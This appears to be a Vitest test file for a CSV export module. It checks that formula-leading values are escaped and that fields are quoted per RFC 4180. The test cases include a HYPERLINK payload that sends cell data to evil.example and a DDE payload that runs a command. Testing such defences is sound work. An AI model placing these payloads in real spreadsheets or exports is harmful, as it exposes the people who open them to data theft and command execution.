import { describe, expect, it } from 'vitest';
import { CSV_EOL, UTF8_BOM, csvField, csvRow, neutralizeFormula } from '../export/csv.js';

describe('CSV injection neutralisation', () => {
  // The attack: an employee sets their own full name, an administrator exports
  // the sheet and opens it, and Excel executes the name.
  it.each(['=1+1', '+1+1', '-1+1', '@SUM(A1)', '\t=1+1', '\r=1+1'])(
    'neutralises a value starting with %j',
    (payload) => {
      const rendered = neutralizeFormula(payload);
      expect(rendered.startsWith("'")).toBe(true);
      expect(rendered).toContain(payload);
    },
  );

  it('neutralises the classic exfiltration payload without losing it', () => {
    const payload = '=HYPERLINK("http://evil.example/?d="&A2,"Click")';
    expect(csvField(payload)).toBe(`"'=HYPERLINK(""http://evil.example/?d=""&A2,""Click"")"`);
  });

  it('neutralises a DDE command-execution payload', () => {
    expect(neutralizeFormula("=cmd|' /C calc'!A0")).toBe("'=cmd|' /C calc'!A0");
  });

  it('leaves an ordinary name untouched', () => {
    expect(neutralizeFormula('Sara Haddad')).toBe('Sara Haddad');
    // A hyphen inside the value is not a formula lead; mangling it would corrupt
    // every double-barrelled name in the organization.
    expect(neutralizeFormula('Jean-Luc Picard')).toBe('Jean-Luc Picard');
  });
});

describe('RFC 4180 rendering', () => {
  it('quotes a field containing the delimiter', () => {
    expect(csvField('Riyadh, Building 4')).toBe('"Riyadh, Building 4"');
  });

  it('escapes an embedded quote by doubling it', () => {
    expect(csvField('Branch "North"')).toBe('"Branch ""North"""');
  });

  it('quotes a field containing a line break', () => {
    expect(csvField('line one\nline two')).toBe('"line one\nline two"');
    expect(csvField('line one\r\nline two')).toBe('"line one\r\nline two"');
  });

  it('does not quote a field that needs no quoting', () => {
    expect(csvField('Head Office')).toBe('Head Office');
  });

  it('renders null and undefined as an empty field, not as the word "null"', () => {
    expect(csvField(null)).toBe('');
    expect(csvField(undefined)).toBe('');
  });

  it('renders numbers unquoted, and a non-finite number as empty', () => {
    expect(csvField(496)).toBe('496');
    expect(csvField(0)).toBe('0');
    // A negative number must not be mistaken for a formula lead.
    expect(csvField(-5)).toBe('-5');
    expect(csvField(Number.NaN)).toBe('');
  });

  it('terminates a record with CRLF', () => {
    expect(csvRow(['a', 'b'])).toBe(`a,b${CSV_EOL}`);
    expect(CSV_EOL).toBe('\r\n');
  });

  it('preserves non-ASCII text verbatim', () => {
    expect(csvField('أحمد الغامدي')).toBe('أحمد الغامدي');
  });

  it('exposes the byte-order mark Excel needs to detect UTF-8', () => {
    expect(Buffer.from(UTF8_BOM, 'utf8')).toEqual(Buffer.from([0xef, 0xbb, 0xbf]));
  });
});
